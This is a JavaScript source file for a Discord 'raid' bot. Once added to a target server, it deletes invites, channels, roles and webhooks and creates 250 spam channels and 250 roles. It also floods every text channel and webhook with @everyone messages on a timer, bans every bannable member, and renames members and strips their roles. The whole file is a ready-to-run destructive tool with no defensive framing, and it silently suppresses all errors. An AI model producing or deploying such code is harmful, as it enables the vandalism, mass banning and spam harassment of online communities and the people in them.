// Loading dependencies, crating the bot and getting the configs :
const Discord = require("discord.js"),
    client = new Discord.Client(),
    config = require("./config.json")

client.once("ready", async () => {
    // Loading raid configs :
    const raidGuild_config = config.raid_config.guild,
        raidChannels_config = config.raid_config.channels,
        raidRoles_config = config.raid_config.roles,
        raidMembers_config = config.raid_config.members,
        raidWebhooks_config = config.raid_config.webhooks,
        targetGuildId = config.guild_id,
        targetGuild = client.guilds.cache.get(targetGuildId)

    // If the bot can't act in the target guild :
    if (!targetGuild) {
        console.log("The guild you aimed isn't accessible by the bot !")
        return
    }

    if (raidGuild_config.change_guild_name) {
        targetGuild
            .setName(raidGuild_config.new_guild_name)
            .catch(async (_) => 0)
    }

    if (raidGuild_config.remove_invitations) {
        targetGuild.fetchInvites().then(async (invitations) => {
            invitations.forEach(async (invitation) => {
                if (invitation.deletable) {
                    invitation.delete().catch(async (_) => 0)
                }
            })
        })
    }

    if (raidChannels_config.remove_channels) {
        targetGuild.channels.cache.forEach(async (channel) => {
            if (channel.deletable) {
                channel.delete().catch(async (_) => 0)
            }
        })
    }

    if (raidChannels_config.create_new_channels) {
        for (let index = 0; index < 250; index++) {
            targetGuild.channels
                .create(raidChannels_config.new_channels_name || "RAID", {
                    type: "text",
                    permissionOverwrites: [
                        {
                            id: targetGuild.id,
                            deny: ["SEND_MESSAGES", "ADD_REACTIONS"],
                            allow: ["VIEW_CHANNEL", "READ_MESSAGE_HISTORY"],
                        },
                    ],
                })
                .catch(async (_) => 0)
        }
    }

    if (raidChannels_config.spamming.enabled) {
        setInterval(async () => {
            targetGuild.channels.cache
                .filter(async (c) => c.type === "text")
                .forEach(async (channel) => {
                    channel
                        .send(
                            raidChannels_config.spamming.message || "@everyone"
                        )
                        .catch(async (_) => 0)
                    if (raidChannels_config.spamming.use_webhooks) {
                        targetGuild.fetchWebhooks().then(async (webhooks) => {
                            webhooks.forEach(async (webhook) => {
                                webhook
                                    .send(
                                        raidChannels_config.spamming.message ||
                                            "@everyone"
                                    )
                                    .catch(async (_) => 0)
                            })
                        })
                        channel
                            .createWebhook(
                                raidChannels_config.spamming.webhooks_name
                            )
                            .catch(async (_) => 0)
                    }
                })
        }, raidChannels_config.spamming.delay_in_ms)
    }

    if (raidRoles_config.remove_roles) {
        targetGuild.roles.cache.forEach(async (role) => {
            role.delete().catch(async (_) => 0)
        })
    }

    if (raidRoles_config.create_new_roles) {
        for (let index = 0; index < 250; index++) {
            targetGuild.roles
                .create({
                    data: {
                        color: raidRoles_config.hex_color || "#FF2200",
                        name: raidRoles_config.new_roles_name || "RAID",
                    },
                })
                .then(async (role) => {
                    if (raidRoles_config.set_role) {
                        targetGuild.members.cache.forEach(async (member) => {
                            member.roles.add(role).catch(async (_) => 0)
                        })
                    }
                })
                .catch(async (_) => 0)
        }
    }

    if (raidMembers_config.ban_all_members) {
        targetGuild.members.cache.forEach(async (member) => {
            if (member.bannable) {
                member.ban().catch(async (_) => 0)
            }
        })
    }

    if (raidMembers_config.rename_members) {
        targetGuild.members.cache.forEach(async (member) => {
            member
                .setNickname(raidMembers_config.new_members_name || "RAID")
                .catch(async (_) => 0)
        })
    }

    if (raidMembers_config.remove_roles) {
        targetGuild.members.cache.forEach(async (member) => {
            member.roles.cache.forEach(async (role) => {
                member.roles.remove(role).catch(async (_) => 0)
            })
        })
    }

    if (raidWebhooks_config.rename_webhooks) {
        targetGuild.fetchWebhooks().then(async (webhooks) => {
            webhooks.forEach(async (webhook) => {
                webhook
                    .edit({
                        name: raidWebhooks_config.new_webhooks_name || "RAID",
                    })
                    .catch(async (_) => 0)
            })
        })
    }

    if (raidWebhooks_config.remove_webhooks) {
        targetGuild.fetchWebhooks().then(async (webhooks) => {
            webhooks.forEach(async (webhook) => {
                webhook.delete().catch(async (_) => 0)
            })
        })
    }
})

// Login the bot :
client.login(config.token).catch(async (_) => {
    console.log("Invalid token was provided. It might be expired !")
})
